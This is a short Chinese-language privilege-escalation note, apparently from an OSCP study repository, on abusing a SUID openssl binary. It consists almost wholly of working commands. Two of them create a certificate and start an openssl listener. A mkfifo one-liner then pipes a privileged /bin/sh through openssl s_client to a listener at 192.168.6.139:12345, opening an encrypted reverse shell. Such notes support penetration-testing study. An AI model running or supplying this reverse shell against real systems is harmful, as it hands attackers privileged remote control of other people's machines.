#openssl suid提权

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
```

在随意一台设备上以root身份执行以下命令
```
mkfifo /tmp/s; /bin/sh -p -i < /tmp/s 2>&1 | openssl s_client -quiet -no_ign_eof -connect 192.168.6.139:12345 > /tmp/s; rm /tmp/s
```

![openssl](https://github.com/Nongcloud/oscp-Learn/tree/master/Privilege-Escalation/SUID/images/suid-openssl.png)